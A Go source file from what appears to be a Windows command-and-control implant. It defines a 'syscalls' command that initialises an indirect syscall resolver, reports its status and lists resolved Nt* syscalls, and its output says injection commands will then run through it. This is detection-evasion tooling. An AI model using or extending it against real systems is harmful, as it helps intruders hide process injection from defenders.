//go:build windows

package commands

import (
	"fmt"
	"sort"
	"strings"

	"fawkes/pkg/structs"
)

// SyscallsCommand shows indirect syscall resolver status
type SyscallsCommand struct{}

func (c *SyscallsCommand) Name() string        { return "syscalls" }
func (c *SyscallsCommand) Description() string { return "Show indirect syscall resolver status" }

type syscallsParams struct {
	Action string `json:"action"` // status, list, init
}

func (c *SyscallsCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[syscallsParams](task)
	if parseErr != nil {
		return *parseErr
	}
	if params.Action == "" {
		params.Action = "status"
	}

	switch strings.ToLower(params.Action) {
	case "status":
		return c.status()
	case "list":
		return c.list()
	case "init":
		return c.initSyscalls()
	default:
		return errorf("Unknown action: %s. Use: status, list, init", params.Action)
	}
}

func (c *SyscallsCommand) status() structs.CommandResult {
	var output strings.Builder
	output.WriteString("[*] Indirect Syscall Resolver Status\n\n")

	if !IndirectSyscallsAvailable() {
		output.WriteString("Status: INACTIVE\n")
		output.WriteString("Indirect syscalls are not initialized.\n")
		output.WriteString("Use 'syscalls init' to initialize, or enable the 'indirect_syscalls' build parameter.\n")
	} else {
		output.WriteString("Status: ACTIVE\n")
		entries := GetResolvedSyscalls()
		resolved := 0
		stubbed := 0
		for _, e := range entries {
			resolved++
			if e.StubAddr != 0 {
				stubbed++
			}
		}
		output.WriteString(fmt.Sprintf("Resolved: %d Nt* syscalls\n", resolved))
		output.WriteString(fmt.Sprintf("Stubs:    %d indirect stubs active\n", stubbed))
		output.WriteString("\nInjection commands will use indirect syscalls (calls originate from ntdll).\n")
	}

	return successResult(output.String())
}

func (c *SyscallsCommand) list() structs.CommandResult {
	if !IndirectSyscallsAvailable() {
		return errorResult("Indirect syscalls not initialized. Use 'syscalls init' first.")
	}

	entries := GetResolvedSyscalls()

	// Sort by syscall number
	type sortEntry struct {
		name  string
		entry *SyscallEntry
	}
	var sorted []sortEntry
	for name, entry := range entries {
		sorted = append(sorted, sortEntry{name, entry})
	}
	sort.Slice(sorted, func(i, j int) bool {
		return sorted[i].entry.Number < sorted[j].entry.Number
	})

	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] Resolved %d Nt* Syscalls\n\n", len(sorted)))
	output.WriteString(fmt.Sprintf("%-40s  %6s  %8s  %s\n", "Function", "SysNum", "Stub", "Gadget"))
	output.WriteString(strings.Repeat("-", 80) + "\n")

	for _, s := range sorted {
		stubStatus := "  --  "
		if s.entry.StubAddr != 0 {
			stubStatus = "ACTIVE"
		}
		gadgetAddr := "  --"
		if s.entry.SyscallRet != 0 {
			gadgetAddr = fmt.Sprintf("0x%X", s.entry.SyscallRet)
		}
		output.WriteString(fmt.Sprintf("%-40s  %6d  %s  %s\n", s.name, s.entry.Number, stubStatus, gadgetAddr))
	}

	return successResult(output.String())
}

func (c *SyscallsCommand) initSyscalls() structs.CommandResult {
	if IndirectSyscallsAvailable() {
		return successResult("Indirect syscalls already initialized.")
	}

	if err := InitIndirectSyscalls(); err != nil {
		return errorf("Error initializing indirect syscalls: %v", err)
	}

	entries := GetResolvedSyscalls()
	stubbed := 0
	for _, e := range entries {
		if e.StubAddr != 0 {
			stubbed++
		}
	}

	return successf("[+] Indirect syscalls initialized: %d Nt* functions resolved, %d stubs active\n[+] Injection commands will now use indirect syscalls", len(entries), stubbed)
}
